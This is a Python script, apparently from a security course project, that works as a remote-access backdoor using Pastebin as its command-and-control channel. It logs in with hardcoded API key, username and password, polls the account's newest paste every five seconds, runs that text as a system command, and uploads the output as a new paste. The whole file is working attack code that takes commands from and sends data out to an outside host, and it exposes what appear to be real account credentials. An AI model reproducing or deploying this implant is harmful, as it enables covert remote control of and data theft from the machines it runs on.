import requests
import subprocess
import time

# Your Pastebin API Developer Key
api_key = "oI_hBDSnHFHmlCcY_TPqeLmV1GCCxu4E"
# Your Pastebin username and password
username = "frequency2612"
password = "cs564_project"

def login_to_pastebin(api_dev_key, username, password):
    data = {
        'api_dev_key': api_dev_key,
        'api_user_name': username,
        'api_user_password': password
    }
    session = requests.Session()
    response = session.post("https://pastebin.com/api/api_login.php", data=data)
    if response.status_code == 200:
        return response.text.strip()
    else:
        return None

def create_paste(api_user_key, text, title="Untitled"):
    paste_text = '\n'.join(str(item) for item in text)

    data = {
        'api_dev_key': api_key,
        'api_user_key': api_user_key,
        'api_option': 'paste',
        'api_paste_expire_date': '10M',
        'api_paste_code': paste_text,
        'api_paste_name': title
    }
    response = requests.post("https://pastebin.com/api/api_post.php", data=data)
    if response.status_code == 200:
        return response.text
    else:
        return None

# Function to retrieve a list of pastes created by the user
def get_user_pastes(api_user_key):
    data = {
        'api_dev_key': api_key,
        'api_user_key': api_user_key,
        'api_option': 'list',
        'api_results_limit': 10  # Adjust as needed, maximum is 1000
    }
    response = requests.post("https://pastebin.com/api/api_post.php", data=data)
    if response.status_code == 200:
        return response.text.strip()
    else:
        return None
    
# Function to retrieve a paste from Pastebin
def get_pastebin_content(api_user_key, paste_key):
    data = {
        'api_dev_key': api_key,
        'api_user_key': api_user_key,
        'api_option': 'show_paste',
        'api_paste_key': paste_key
    }
    response = requests.post("https://pastebin.com/api/api_raw.php", data=data)
    if response.status_code == 200:
        return response.text.strip()
    else:
        return None
    
def fetch_latest_key(pastes_data):
    paste_keys = []

    if pastes_data != "No pastes found.":
        strings = [line.split(',')[0] for line in pastes_data.split('\n')]
        expression = "<paste_key>"
        for string in strings:
            string = string.strip()
            if string.startswith(expression):
                paste_keys.append(string[len(expression):len(expression) + 8])

        return paste_keys[0]
    else:
        print(pastes_data)

    return None

# Login to Pastebin
api_user_key = login_to_pastebin(api_key, username, password)
if api_user_key:
    print("Successfully logged in to Pastebin.")
else:
    print("Failed to log in to Pastebin.")

while api_user_key:
    latest_key = fetch_latest_key(get_user_pastes(api_user_key))

    if latest_key is not None:
        paste_content = get_pastebin_content(api_user_key, latest_key)
        if paste_content:
            print("Command given is: {}".format(paste_content))

            command = paste_content.split(' ')
            p = subprocess.Popen(command, stdout=subprocess.PIPE)
            output = []

            for i in p.stdout.readlines():
                output.append(i.decode().strip())

            if output == []:
                output = "Done"

            text_to_upload = output
            paste_title = f"Response {time.ctime()}"
            paste_url = create_paste(api_user_key, text_to_upload, paste_title)
            if paste_url:
                print("Paste uploaded successfully. URL:", paste_url)
            else:
                print("Failed to upload paste.")
        else:
            print("Failed to retrieve paste content.")
    
    time.sleep(5)